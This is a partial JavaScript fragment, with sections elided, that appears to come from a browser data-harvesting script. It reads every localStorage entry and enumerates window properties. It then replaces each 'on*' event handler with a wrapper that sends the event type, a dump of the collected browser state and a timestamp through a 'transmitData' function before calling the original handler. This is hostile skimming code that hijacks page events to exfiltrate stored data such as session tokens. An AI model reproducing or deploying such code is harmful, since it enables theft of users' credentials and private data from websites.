function exploreWindowObject() {
  ...
  if (typeof localStore === "object") {
    newDiscoveries["localStorage"] = {};
    for (let i = 0; i < localStore.length; i++) {
      newDiscoveries["localStorage"][localStore.key(i)] = localStore.getItem(localStore.key(i));
    }
  }
  for (const prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop) && !window.seenVars.includes(prop)) {
      ...
      if (prop.match(/^(on)[a-z]+/) && propValue instanceof Function) {
        window.removeEventListener(prop.slice(2), propValue);
        window.addEventListener(prop.slice(2), function (e) {
          transmitData({
            eventType: e.type,
            details: exploreWindowObject(),
            timestamp: Date.now()
          });
          propValue(e);
        });
